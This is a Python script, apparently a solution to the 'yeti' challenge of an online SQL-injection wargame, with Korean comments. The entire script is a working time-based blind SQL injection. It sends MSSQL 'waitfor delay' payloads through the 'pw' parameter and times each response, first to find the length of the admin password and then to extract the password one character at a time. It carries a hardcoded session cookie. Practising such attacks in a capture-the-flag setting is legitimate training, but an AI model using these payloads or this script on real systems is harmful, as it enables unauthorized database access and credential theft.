import string
import requests
import time

url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
params = {"pw" : None}
cookies = {"PHPSESSID" : "qp6b7g99hjr3amos0h8f72npl5"}

# 비밀번호 길이
for i in range(30):
    payload = "' if((select len(pw) from prob_yeti where id='admin')={}) waitfor delay '0:0:2'-- -".format(i)
    params["pw"]=payload
    print(payload)
    start_time = time.time()
    response = requests.get(url,params=params,cookies=cookies)
    end_time = time.time()
    if(end_time - start_time >2):
        print("find the pw len",i)
        break

# 비밀번호 길이 8
# 비밀번호
flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "' if((select ascii(substring(pw,{},1)) from prob_yeti where id='admin') = {}) waitfor delay '0:0:2'-- -".format(i,ord(j))
        params["pw"]=payload
        print(payload)
        start_time = time.time()
        response = requests.get(url,params=params,cookies=cookies)
        end_time = time.time()
        if(end_time - start_time >2):
            flag += j
            print("find the pw",flag)
            break
print(flag)